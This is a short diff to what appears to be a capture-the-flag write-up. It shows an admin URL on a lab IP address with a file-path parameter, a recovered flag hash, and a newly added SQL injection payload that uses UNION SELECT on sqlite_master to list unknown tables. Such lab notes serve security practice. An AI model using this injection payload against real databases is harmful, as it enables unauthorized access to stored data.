@@ -114,3 +114,11 @@ http://139.91.71.5:11337/admin?show=/files/realflag
 and the flag is,
 972f02eb8227012f0b9954e95efc4001a28290ef48047a922efc2a4db40954e6
 
+
+
+Extra: 
+check if there are any new tables:
+' UNION SELECT name, 'table', NULL FROM sqlite_master WHERE (type='table' and name <> "items" and name <> "sqlite_sequence" and name <> "users") --
+
+
+
